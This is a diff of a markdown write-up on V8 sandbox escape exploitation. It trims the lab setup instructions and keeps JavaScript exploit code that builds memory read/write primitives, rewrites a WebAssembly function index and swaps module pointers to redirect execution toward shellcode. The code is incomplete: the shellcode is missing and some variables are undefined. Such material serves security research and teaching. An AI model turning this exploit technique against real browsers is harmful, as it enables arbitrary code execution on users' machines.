@@ -7,90 +7,17 @@ tags:
   - V8
 ---
 
-## Setting up lab and building V8
-
-### Install Essential Build Tools, V8 Source Code, and Debug Configuration
+## Setting up lab 
 
 ```bash
-sudo apt-get update
-
-sudo apt-get install -y \
-    git \
-    python3 \
-    python3-pip \
-    build-essential \
-    cmake
-
-sudo apt-get install -y \
-    pkg-config \
-    gperf \
-    ninja-build \
-    clang \
-    libc++-dev \
-    libglib2.0-dev
-
 git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
-
 export PATH=$PATH:$PWD/depot_tools
-
 mkdir v8-debug
 cd v8-debug
-
 fetch v8
 cd v8
-
 gn gen out/debug --args='is_debug=true v8_enable_debugging_features=true v8_enable_disassembler=true symbol_level=2'
-
 ninja -C out/debug
-```
-
-## Security Tools and Testing Environment
-
-### Install Essential Analysis Tools and Set Up Directories
-
-```bash
-sudo apt-get install -y \
-    gdb \
-    lldb \
-    valgrind \
-    strace \
-    ltrace \
-    afl++ \
-    radare2 \
-    checksec \
-    ropper \
-    pwndbg
-
-mkdir ~/v8-testcases
-mkdir ~/v8-crashes
-
-cat > v8-wrapper.js << EOL
-try {
-    eval(process.argv[2]);
-} catch (e) {
-    console.error(e);
-}
-EOL
-```
-
-### Docker Configuration and Debug Commands
-
-```bash
-cat > Dockerfile << EOL
-FROM ubuntu:latest
-RUN apt-get update && apt-get install -y \
-    git \
-    python3 \
-    build-essential \
-    cmake
-WORKDIR /v8
-EOL
-
-out/debug/d8 --allow-natives-syntax
-
-out/debug/d8 --jitless
-
-out/debug/d8 --trace-ic --trace-opt --trace-deopt
 ```
 
 ## Typical Exploit Flow 
@@ -151,7 +78,7 @@ External Object                       Offset from Base
                        |
                        v
     +------------------------------------------------------------------------------------+
-    |           >>> Sandbox Boundary Breached (Controlled Offset) <<<                   |
+    |           >>> Sandbox Boundary (Controlled Offset) <<<                   |
     +------------------------------------------------------------------------------------+
                        |
                        v
@@ -222,10 +149,8 @@ function smi(i) {
     return i << 1n;
 }
 
-// Setup sandbox memory view for read/write primitives  
 let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
-// Memory primitives / v8 utils
 function addrOf(obj) {
     return Sandbox.getAddressOf(obj);
 }
@@ -238,7 +163,7 @@ function v8_write64(addr, val) {
     return sandboxMemory.setBigInt64(Number(addr), val, true);
 }
 
-// Step 1: Create WASM Table for indirect function calls 
+// Create WASM Table for indirect function calls 
 const rtb = new WebAssembly.Table({
     initial: 1,
     element: "anyfunc",
@@ -249,7 +174,7 @@ const importObject = {
     env: { rtb }
 };
 
-// Step 2: Create first WASM module (Module 0) with simple float return
+// Create first WASM module (Module 0) with simple float return
 let wasm_code_0 = new Uint8Array([
     0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
     0x00, 0x01, 0x7d, 0x03, 0x02, 0x01, 0x00, 0x07, 0x0c, 0x01, 0x08, 0x69,
@@ -261,7 +186,7 @@ let wasm_mod_0 = new WebAssembly.Module(wasm_code_0);
 let wasm_instance_0 = new WebAssembly.Instance(wasm_mod_0);
 let indirect = wasm_instance_0.exports.indirect;
 
-// Step 3: Create second WASM module (Module 1) that calls Module 0's function indirectly
+// Create second WASM module (Module 1) that calls Module 0's function indirectly
 let wasm_code_1 = new Uint8Array([
     0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x02, 0x60,
     0x00, 0x01, 0x7d, 0x60, 0x01, 0x7d, 0x01, 0x7d, 0x02, 0x0d, 0x01, 0x03,
@@ -274,45 +199,28 @@ let wasm_code_1 = new Uint8Array([
 let wasm_mod_1 = new WebAssembly.Module(wasm_code_1);
 let wasm_instance_1 = new WebAssembly.Instance(wasm_mod_1, importObject);
 
-// Step 4: Create Module 2 with many functions to bypass size check
-// This module should contain a large number of functions
-// 
 
-// Step 5: Set up the exploit
 console.log("[*] Gathering info about Wasm Exported Function");
 let addr_wasm_function = addrOf(indirect);
 let shared_info = v8_read64(addr_wasm_function + 0x10n) & 0xFFFFFFFFn;
 let function_data = v8_read64(shared_info - 1n + 0x8n) & 0xFFFFFFFFn;
 let addr_function_data_index = function_data - 1n + 0x14n;
 
-// Step 6: Modify function index
 console.log("[*] Writing new index in Wasm Function Data");
 let current_value = v8_read64(addr_function_data_index);
 console.log("\t[i] Current Function data index: ", ToHex(current_value));
 
-// Calculate new index that will point to our shellcode
 let new_index = current_value & 0xffffffff00000000n | smi(401n);
 console.log("\t[i] New Function data index: ", ToHex(new_index));
 
-// Step 7: Swap Module 2 with Module 0 in Instance 0 to bypass size check
 console.log("[*] Writing module 2 in instance 0");
-let addr_wasm_module_2 = addrOf(wasm_mod_2); // assuming wasm_mod_2 was created
+let addr_wasm_module_2 = addrOf(wasm_mod_2); 
 console.log("\t[i] Current Module 0: ", ToHex(addr_wasm_module_0));
 console.log("\t[i] New Module 0: ", ToHex(addr_wasm_module_0 & 0xffffffff00000000n | addr_wasm_module_2));
-
-// Perform the module swap
 v8_write64(addr_wasm_instance_0 + 0x10n, addr_wasm_module_0 & 0xffffffff00000000n | addr_wasm_module_2);
-
-// Step 8: Write the modified function index
 v8_write64(addr_function_data_index, new_index);
-
-// Step 9: Setup shellcode in WASM RWX memory using Liftoff compiled floating points
-// [Add shellcode setup code here]
-
-// Step 10: Trigger the exploit
-rtb.set(0, indirect); // This will now use our modified index
-wasm_instance_1.exports.main(1000); // This will trigger our shellcode
-
+rtb.set(0, indirect); 
+wasm_instance_1.exports.main(1000); 
 ```
 
 
